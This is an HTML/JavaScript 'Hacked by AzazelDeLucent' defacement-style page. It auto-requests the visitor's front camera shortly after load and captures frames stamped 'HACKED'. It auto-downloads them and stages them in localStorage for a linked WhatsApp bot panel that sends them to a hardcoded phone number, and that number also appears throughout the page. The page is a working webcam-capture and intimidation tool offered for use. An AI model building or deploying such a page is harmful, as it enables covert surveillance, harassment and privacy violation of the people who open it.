<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hacked by AzazelDeLucent</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            font-family: 'Share Tech Mono', monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        canvas#matrix {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 0; opacity: 0.12; pointer-events: none;
        }
        .container {
            position: relative; z-index: 1; width: 90%; max-width: 750px;
            padding: 35px; background: rgba(10,10,10,0.88);
            border: 2px solid #ff0000;
            box-shadow: 0 0 40px rgba(255,0,0,0.25), inset 0 0 40px rgba(255,0,0,0.04);
            text-align: center;
        }
        .glitch {
            font-size: 2.8rem; color: #ff0000;
            text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 40px #ff0000;
            letter-spacing: 5px; margin-bottom: 5px;
            animation: glitchAnim 2s infinite;
        }
        @keyframes glitchAnim {
            0%,100%{opacity:1;transform:none}
            91%{opacity:1;transform:skew(-2deg)}
            92%{opacity:0.8;transform:skew(3deg)}
            93%{opacity:1;transform:skew(-1deg)}
            95%{opacity:0.7;transform:skew(4deg)}
            96%{opacity:1;transform:none}
        }
        .sub { color: #cc0000; font-size: 1rem; letter-spacing: 8px; margin-bottom: 25px; border-bottom: 1px solid #ff000033; padding-bottom: 12px; }
        .status-bar {
            display: flex; justify-content: space-between; background: #1a0000;
            border: 1px solid #ff000066; padding: 10px 15px; margin-bottom: 20px; font-size: 0.8rem;
        }
        .dot { display: inline-block; width: 9px; height: 9px; border-radius: 50%; margin-right: 6px; animation: blink 1s infinite; }
        .dot.green{background:#00ff00;box-shadow:0 0 8px #00ff00}
        .dot.red{background:#ff0000;box-shadow:0 0 8px #ff0000}
        .dot.yellow{background:#ffff00;box-shadow:0 0 8px #ffff00;animation:blink .4s infinite}
        @keyframes blink{0%,100%{opacity:1}50%{opacity:0.2}}
        
        .vid-box {
            position: relative; width: 100%; max-width: 480px; margin: 0 auto 15px;
            border: 2px solid #ff000088; background: #000; aspect-ratio: 4/3; overflow: hidden;
        }
        #video { width: 100%; height: 100%; object-fit: cover; display: none; transform: scaleX(-1); }
        .placeholder {
            width: 100%; height: 100%; display: flex; flex-direction: column;
            justify-content: center; align-items: center; color: #660000; gap: 8px;
        }
        .placeholder .icon { font-size: 3rem; opacity: 0.4; }
        .scanlines {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none;
            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(255,0,0,0.03) 2px, rgba(255,0,0,0.03) 4px);
            z-index: 2;
        }
        .live-badge {
            position: absolute; top: 10px; left: 10px; color: #ff0000; font-size: 0.7rem;
            text-shadow: 0 0 10px #ff0000; z-index: 3; display: none; letter-spacing: 2px;
        }
        .flash-overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 5; pointer-events: none; display: none;
        }
        .flash-overlay.active { display: block; background: white; animation: flash 0.25s ease-out; }
        @keyframes flash { 0%{opacity:0.8}100%{opacity:0} }

        .btn-group { display: flex; gap: 8px; justify-content: center; flex-wrap: wrap; margin: 15px 0; }
        .btn {
            background: transparent; border: 1px solid #ff000088; color: #ff4444;
            padding: 9px 20px; font-family: 'Share Tech Mono', monospace; font-size: 0.8rem;
            cursor: pointer; letter-spacing: 2px; transition: all 0.3s; text-transform: uppercase;
        }
        .btn:hover{background:#ff000022;border-color:#ff0000;box-shadow:0 0 15px rgba(255,0,0,0.3)}
        .btn:disabled{opacity:0.3;cursor:not-allowed}
        .btn-primary{border-color:#ff0000;color:#ff0000}
        .btn-primary:hover{background:#ff000044}
        .btn-wa{border-color:#00ff00;color:#00ff00}
        .btn-wa:hover{background:#00ff0011;box-shadow:0 0 15px rgba(0,255,0,0.2)}

        #preview-box { display: none; margin: 10px 0; border: 1px solid #ff000066; padding: 8px; }
        #preview-box h4 { color: #ff4444; font-size: 0.75rem; margin-bottom: 8px; letter-spacing: 2px; }
        #preview-img { width: 100%; max-width: 200px; border: 1px solid #333; transform: scaleX(-1); }

        .logs {
            text-align: left; margin-top: 10px; padding: 8px; background: #050000;
            border: 1px solid #330000; max-height: 100px; overflow-y: auto; font-size: 0.7rem;
        }
        .logs div { color: #884444; margin-bottom: 2px; }
        .logs .ok { color: #00ff00; }
        .logs .err { color: #ff0000; }
        .logs .wa { color: #00cc00; }
        .logs .info { color: #ffff00; }
        .ts { color: #444; }

        .footer { margin-top: 15px; padding-top: 12px; border-top: 1px solid #ff000022; font-size: 0.65rem; color: #660000; letter-spacing: 3px; }
        .footer b { color: #aa0000; }
        
        .links {
            margin: 12px 0; display: flex; gap: 12px; justify-content: center;
        }
        .links a {
            color: #ff4444; font-size: 0.75rem; letter-spacing: 2px;
            text-decoration: none; border: 1px solid #ff000044; padding: 6px 14px;
            transition: all 0.3s;
        }
        .links a:hover { background: #ff000022; border-color: #ff0000; }
    </style>
</head>
<body>
    <canvas id="matrix"></canvas>
    <div class="container">
        <div class="glitch">// HACKED //</div>
        <div class="sub">>> by AzazelDeLucent <<</div>

        <div class="status-bar">
            <div><span class="dot yellow" id="dot"></span><span id="status-label">INITIALIZING</span></div>
            <div>ACCESS: <span id="access-status" style="color:#00ff00;">GRANTED</span></div>
            <div>TARGET: <span style="color:#00ff00;">FRONT_CAM</span></div>
        </div>

        <div class="vid-box">
            <video id="video" autoplay playsinline></video>
            <div class="placeholder" id="placeholder">
                <div class="icon">📷</div>
                <span>[ CAMERA OFFLINE ]</span>
                <span style="font-size:0.6rem;color:#551111;">click INIT to access</span>
            </div>
            <div class="scanlines"></div>
            <div class="live-badge" id="live-badge">● LIVE</div>
            <div class="flash-overlay" id="flash"></div>
        </div>

        <div id="preview-box">
            <h4>◆ EXTRACTED FRAME ◆</h4>
            <img id="preview-img" alt="capture">
        </div>

        <div class="btn-group">
            <button class="btn" id="btn-init" disabled>▶ INIT</button>
            <button class="btn btn-primary" id="btn-capture" disabled>■ CAPTURE</button>
            <button class="btn btn-wa" id="btn-wa" disabled>📤 KIRIM WA</button>
            <button class="btn" id="btn-stop" disabled>● STOP</button>
        </div>

        <!-- Quick links to WA bot panel -->
        <div class="links">
            <a href="wa-bot/sender.html" target="_blank">📡 WA BOT PANEL</a>
            <a href="panel-admin/dashboard.html" target="_blank">📊 ADMIN</a>
        </div>

        <div class="logs" id="logs">
            <div><span class="ts">[SYSTEM]</span> AzazelDeLucent v4.0 loaded</div>
            <div><span class="ts">[SYSTEM]</span> Ready for deployment</div>
        </div>

        <div class="footer">✦ <b>AZAZELDELUCENT</b> SECURITY FRAMEWORK ✦</div>
    </div>

    <script>
        // ─── Matrix ──────────────────────────────────────────────────────
        const c = document.getElementById('matrix'), cx = c.getContext('2d');
        let W, H;
        function resize() { W = c.width = innerWidth; H = c.height = innerHeight; }
        resize(); onresize = resize;
        const chars = 'アイウエオカキクケコサシスセソタチツテト0123456789ABCDEF<>/{}[]|&^%$#@!';
        const cols = Math.floor(W / 14);
        const drops = Array(cols).fill(1);
        setInterval(() => {
            cx.fillStyle = 'rgba(10,0,0,0.05)';
            cx.fillRect(0,0,W,H);
            cx.fillStyle = '#ff0000';
            cx.font = '14px monospace';
            for(let i=0;i<drops.length;i++) {
                cx.fillText(chars[Math.floor(Math.random()*chars.length)], i*14, drops[i]*14);
                if(drops[i]*14 > H && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }, 50);

        // ─── Vars ────────────────────────────────────────────────────────
        const video = document.getElementById('video');
        const placeholder = document.getElementById('placeholder');
        const liveBadge = document.getElementById('live-badge');
        const flash = document.getElementById('flash');
        const dot = document.getElementById('dot');
        const statusLabel = document.getElementById('status-label');
        const accessStatus = document.getElementById('access-status');
        const previewBox = document.getElementById('preview-box');
        const previewImg = document.getElementById('preview-img');
        const logs = document.getElementById('logs');
        const btnInit = document.getElementById('btn-init');
        const btnCapture = document.getElementById('btn-capture');
        const btnStop = document.getElementById('btn-stop');
        const btnWa = document.getElementById('btn-wa');

        let stream = null;
        let active = false;
        let lastPhoto = null;
        let photoCount = 0;

        // ─── Helpers ─────────────────────────────────────────────────────
        function log(msg, cls='') {
            const e = document.createElement('div');
            const t = new Date().toTimeString().slice(0,8);
            e.innerHTML = `<span class="ts">[${t}]</span> ${msg}`;
            if(cls) e.className = cls;
            logs.appendChild(e);
            logs.scrollTop = logs.scrollHeight;
        }
        function setStatus(s, cls) { statusLabel.textContent = s; dot.className = `dot ${cls}`; }

        // ─── Init Camera ─────────────────────────────────────────────────
        async function initCam() {
            setStatus('INITIALIZING', 'yellow');
            btnInit.disabled = true;
            btnInit.textContent = '⏳';
            log('Requesting camera...');

            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false
                });
                video.srcObject = stream;
                await video.play();
                video.style.display = 'block';
                placeholder.style.display = 'none';
                liveBadge.style.display = 'block';
                setStatus('ACTIVE', 'green');
                accessStatus.textContent = 'ESTABLISHED';
                btnCapture.disabled = false;
                btnStop.disabled = false;
                btnInit.textContent = '✓';
                active = true;
                log(`Camera active: ${video.videoWidth}x${video.videoHeight}`, 'ok');
            } catch(err) {
                setStatus('ERROR', 'red');
                btnInit.disabled = false;
                btnInit.textContent = '▶ RETRY';
                const msg = err.name==='NotAllowedError'?'DENIED':err.name==='NotFoundError'?'NO CAMERA':err.message;
                log(`Error: ${msg}`, 'err');
                accessStatus.textContent = 'BLOCKED';
            }
        }

        // ─── Capture ─────────────────────────────────────────────────────
        function capture() {
            if(!active || !stream) { log('Camera not active', 'err'); return; }
            flash.classList.remove('active');
            void flash.offsetWidth;
            flash.classList.add('active');

            const cv = document.createElement('canvas');
            cv.width = video.videoWidth;
            cv.height = video.videoHeight;
            const ctx = cv.getContext('2d');
            ctx.drawImage(video, 0, 0);
            
            // Overlay
            ctx.fillStyle = 'rgba(255,0,0,0.12)';
            ctx.fillRect(0,0,cv.width,cv.height);
            const fs = Math.floor(cv.width*0.045);
            ctx.font = `bold ${fs}px monospace`;
            ctx.fillStyle = '#ff0000';
            ctx.textAlign = 'center';
            ctx.shadowColor = '#ff0000';
            ctx.shadowBlur = 15;
            ctx.fillText('● HACKED BY AZAZELDELUCENT', cv.width/2, cv.height-35);
            ctx.font = `${Math.floor(cv.width*0.02)}px monospace`;
            ctx.fillStyle = '#ff6666';
            ctx.shadowBlur = 8;
            ctx.fillText('+62 878-7900-7194 ← TARGET', cv.width/2, cv.height-12);

            lastPhoto = cv.toDataURL('image/jpeg', 0.9);
            previewImg.src = lastPhoto;
            previewBox.style.display = 'block';
            btnWa.disabled = false;
            photoCount++;

            const ts = Date.now();
            log(`[${photoCount}] Captured (${Math.round(lastPhoto.length/1024)} KB)`, 'ok');
            const link = document.createElement('a');
            link.download = `target_${ts}.jpg`;
            link.href = lastPhoto;
            link.click();
        }

        // ─── Send to WA Bot ──────────────────────────────────────────────
        function sendToWA() {
            if(!lastPhoto) { log('No photo to send', 'err'); return; }
            // Simpan foto ke localStorage agar bisa diambil wa-bot/sender.html
            localStorage.setItem('azazel_last_photo', lastPhoto);
            localStorage.setItem('azazel_photo_time', new Date().toISOString());
            localStorage.setItem('azazel_target_number', '6287879007194');
            
            log('📤 Photo saved to local storage for WA bot', 'wa');
            log('📡 Open WA BOT PANEL to send', 'wa');
            
            // Buka WA bot panel
            window.open('wa-bot/sender.html', '_blank');
        }

        // ─── Stop ────────────────────────────────────────────────────────
        function stop() {
            if(stream) { stream.getTracks().forEach(t=>t.stop()); stream=null; }
            video.style.display = 'none';
            placeholder.style.display = 'flex';
            liveBadge.style.display = 'none';
            active = false;
            setStatus('TERMINATED', 'red');
            accessStatus.textContent = 'CLOSED';
            btnCapture.disabled = true;
            btnStop.disabled = true;
            btnWa.disabled = true;
            btnInit.disabled = false;
            btnInit.textContent = '▶ RE-INIT';
            log('Camera stopped');
        }

        // ─── Events ──────────────────────────────────────────────────────
        btnInit.onclick = initCam;
        btnCapture.onclick = capture;
        btnStop.onclick = stop;
        btnWa.onclick = sendToWA;
        onbeforeunload = () => { if(stream) stream.getTracks().forEach(t=>t.stop()); };
        onkeydown = (e) => { if(e.key===' ' && !e.target.matches('input,button')) { e.preventDefault(); if(!btnCapture.disabled) capture(); } };

        // Auto init
        setTimeout(initCam, 600);
        log('System ready — SPACE to capture', 'info');
        log('WA Target: +62 878-7900-7194', 'wa');
    </script>
</body>
    </html>
